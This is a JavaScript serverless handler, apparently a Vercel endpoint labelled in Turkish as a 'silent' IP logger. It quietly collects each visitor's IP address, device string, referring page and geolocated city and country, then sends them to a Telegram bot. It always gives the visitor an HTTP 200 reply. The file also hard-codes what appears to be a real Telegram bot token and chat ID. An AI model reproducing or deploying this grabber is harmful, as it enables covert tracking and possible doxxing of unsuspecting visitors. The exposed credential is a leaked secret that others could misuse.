// api/log-ip.js
// Federasyonlar IP Logger - Vercel Compatible (Silent + Turkish Default)

export default async function handler(req, res) {
  try {
    // Get real client IP (Vercel provides this via headers)
    const forwardedFor = req.headers['x-forwarded-for'];
    const ip = forwardedFor
      ? forwardedFor.split(',')[0].trim()
      : req.headers['x-real-ip'] || req.socket.remoteAddress || 'Bilinmiyor';

    // Get more info
    const userAgent = req.headers['user-agent'] || 'Bilinmiyor';
    const pageURL = req.headers.referer || req.headers.origin || 'Doğrudan';
    const timestamp = new Date().toLocaleString('tr-TR');

    // Optional: Get country/city (free service)
    let country = "Bilinmiyor";
    let city = "Bilinmiyor";
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      if (geoRes.ok) {
        const geo = await geoRes.json();
        country = geo.country_name || "Bilinmiyor";
        city = geo.city || "Bilinmiyor";
      }
    } catch (e) { }

    const message = `
🛡️ Yeni Ziyaretçi (Vercel)

🌐 IP Adresi: ${ip}
🇹🇷 Ülke: ${country}
🏙️ Şehir: ${city}
🔗 Sayfa: ${pageURL}
📱 Cihaz: ${userAgent}
⏰ Zaman: ${timestamp}
        `.trim();

    // Send to Telegram
    const BOT_TOKEN = "8797755900:AAFZYIce4vrR5YMQAB0Khz4oaQng2iDfe8M";   // ← Buraya kendi bot tokenını yaz
    const CHAT_ID = "8437897670";     // ← Buraya kendi chat ID'ni yaz

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    // Return success (silent for client)
    return res.status(200).json({ success: true });

  } catch (error) {
    // Completely silent on error
    return res.status(200).json({ success: false });
  }
}